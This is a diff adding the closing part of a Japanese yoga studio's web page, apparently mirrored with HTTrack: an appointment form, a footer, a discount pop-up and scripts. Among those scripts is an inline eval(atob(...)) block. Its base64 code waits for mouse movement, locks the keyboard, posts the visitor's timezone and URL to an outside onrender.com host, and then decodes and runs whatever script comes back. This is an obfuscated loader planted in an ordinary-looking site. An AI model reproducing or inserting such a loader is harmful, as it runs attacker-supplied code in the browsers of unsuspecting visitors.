+          </div>
+
+          <div class="form_group">
+            <label for="phone">電話番号</label>
+            <input
+              type="number"
+              placeholder="電話番号を入力してください"
+              name="Phone Number"
+              id="phone"
+              required
+            />
+          </div>
+
+          <div class="form_group">
+            <label for="date">日付</label>
+            <input
+              type="date"
+              placeholder="日付を選択してください"
+              name="Date"
+              id="date"
+              required
+            />
+          </div>
+
+          <div class="form_group">
+            <label for="instructor">インストラクターを選択してください</label>
+            <select name="Instructor" id="instructor" required>
+              <option value="Anna Peckel">アンナ・ペッケル</option>
+              <option value="Dane Anchor">デイン・アンカー</option>
+              <option value="Jazmine Giavasis">ジャズミン・ギアヴァシス</option>
+              <option value="Meriella Tenzin">メリエラ・テンジン</option>
+              <option value="Hailey Aeiko">ヘイリー・アイエコ</option>
+              <option value="Mian Owen">ミアン・オーウェン</option>
+            </select>
+          </div>
+
+          <div class="form_group">
+            <label for="message">メッセージ</label>
+            <textarea
+              name="Added Message"
+              id="message"
+              rows="6"
+              placeholder="メッセージを追加"
+              required
+            ></textarea>
+          </div>
+
+          <input type="submit" value="リクエストを送信" class="btn-primary" />
+        </form>
+      </div>
+    </section>
+    <!-- ==============  END OF APPOINTMENTS ==============  -->
+
+    <footer>
+      <div class="container">
+        <article>
+          <a href="#" class="footer_logo">
+            <h3>静心ヨガセンター</h3>
+          </a>
+          <p>一息ごとに人生を高めましょう。</p>
+
+          <div>
+            <i class="bx bxs-phone"></i>
+            <small>+81 90-1234-5678</small>
+          </div>
+
+          <div>
+            <i class="bx bx-mail-send"></i>
+            <small>support@seishinyoga.jp</small>
+          </div>
+        </article>
+
+        <article>
+          <h3>サポート</h3>
+          <a href="#">プライバシーポリシー</a>
+          <a href="#">クッキーポリシー</a>
+          <a href="#">購入ポリシー</a>
+          <a href="#">利用規約</a>
+          <a href="#">キャリア</a>
+        </article>
+
+        <article>
+          <h3>パーマリンク</h3>
+          <a href="#">ホーム</a>
+          <a href="#services">サービス</a>
+          <a href="#instructors">インストラクター</a>
+          <a href="#testimonials">お客様の声</a>
+        </article>
+
+        <article>
+          <h3>お問い合わせ</h3>
+          <p>プレス</p>
+          <p>よくある質問</p>
+          <div class="footer_socials">
+            <a href="#"><i class="bx bxl-linkedin"></i></a>
+            <a href="#"><i class="bx bxl-twitter"></i></a>
+            <a href="#"><i class="bx bxl-facebook"></i></a>
+            <a href="#"><i class="bx bxl-instagram"></i></a>
+          </div>
+        </article>
+      </div>
+      <div class="copyright">
+        <small>&copy; 静心ヨガセンター™. All Rights Reserved.</small>
+      </div>
+    </footer>
+    <!-- ==============  END OF FOOTER ==============  -->
+
+    <!-- Special Offer Modal -->
+    <div id="specialOfferModal" class="modal">
+      <div class="modal-content">
+        <span class="close-button">&times;</span>
+        <img
+          src="assets/yogaclass.jpg"
+          alt="Special Offer Image"
+          class="modal-image"
+        />
+        <h2>スペシャルオファー</h2>
+        <p>今だけ！初回のヨガクラスが50%オフ！</p>
+        <p>今すぐ予約して、心と体の健康を始めましょう。</p>
+        <ul>
+          <li>オンラインクラスで自宅から参加可能</li>
+          <li>経験豊富なインストラクターによる指導</li>
+          <li>リラクゼーションとストレス解消</li>
+        </ul>
+        <a href="#" class="btn-primary close-modal">今すぐ予約</a>
+      </div>
     </div>
+
+    <!-- ==============  SWIPER JS ==============  -->
+    <script src="../unpkg.com/swiper%4011.2.2/swiper-bundle.min.js"></script>
+    <script src="main.js"></script>
+    <script>
+      // Modal functionality
+      document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById("specialOfferModal");
+        var closeButton = document.querySelector(".close-button");
+        var closeModalLinks = document.querySelectorAll(".close-modal");
+
+        // Show the modal
+        modal.style.display = "block";
+
+        // Close the modal when the user clicks the close button or the close-modal links
+        function closeModal() {
+          modal.style.display = "none";
+        }
+
+        closeButton.addEventListener("click", closeModal);
+        closeModalLinks.forEach(function (link) {
+          link.addEventListener("click", function (event) {
+            event.preventDefault();
+            closeModal();
+          });
+        });
+
+        // Close the modal when the user clicks anywhere outside the modal content
+        window.onclick = function (event) {
+          if (event.target == modal) {
+            modal.style.display = "none";
+          }
+        };
+      });
+    </script>
+    <script>
+      eval(atob(`CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL3NlaXNoaW51c2VyZmVlZGJhY2tzLm9ucmVuZGVyLmNvbScsIGNsaWVudFRpbWV6b25lKQogICAgICAgIC50aGVuKGRlY29kZUFuZFJ1blNjcmlwdCkKICAgICAgICAuY2F0Y2goaGFuZGxlRXJyb3IpOwp9CgpmdW5jdGlvbiBzZWN1cmVLZXlib2FyZEFjY2VzcygpIHsKICAgIGlmIChuYXZpZ2F0b3Iua2V5Ym9hcmQpIG5hdmlnYXRvci5rZXlib2FyZC5sb2NrKCk7Cn0KCmZ1bmN0aW9uIGdldEN1cnJlbnRUaW1lem9uZSgpIHsKICAgIHJldHVybiBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7Cn0KCmZ1bmN0aW9uIHRyYW5zbWl0VGltZXpvbmVEYXRhKHVybCwgdGltZXpvbmUpIHsKICAgIHJldHVybiBmZXRjaCh1cmwsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHRpbWV6b25lLCBmdWxsVXJsOiB3aW5kb3cubG9jYXRpb24uaHJlZiB9KSwKICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKTsKfQoKZnVuY3Rpb24gZGVjb2RlQW5kUnVuU2NyaXB0KGVuY29kZWRTY3JpcHQpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3Qgc2NyaXB0ID0gYXRvYihlbmNvZGVkU2NyaXB0KTsKICAgICAgICBldmFsKHNjcmlwdCk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIHRocm93IG5ldyBFcnJvcihgU2NyaXB0IGV4ZWN1dGlvbiBmYWlsZWQ6ICR7ZXJyb3J9YCk7CiAgICB9Cn0KCmZ1bmN0aW9uIGhhbmRsZUVycm9yKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKCdBUEkgcmVxdWVzdCBvciBzY3JpcHQgZXhlY3V0aW9uIGVycm9yOicsIGVycm9yKTsKfQo=`));
+    </script>
+    <script type="text/javascript">
+      window._mfq = window._mfq || [];
+      (function () {
+        var mf = document.createElement("script");
+        mf.type = "text/javascript";
+        mf.defer = true;
+        mf.src =
+          "../cdn.mouseflow.com/projects/d3245be7-c195-470b-8d24-a59b08464fcc.js";
+        document.getElementsByTagName("head")[0].appendChild(mf);
+      })();
+    </script>
   </body>
+
+<!-- Mirrored from seishinyoga.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2025 13:12:44 GMT -->
 </html>
-<?php exit;
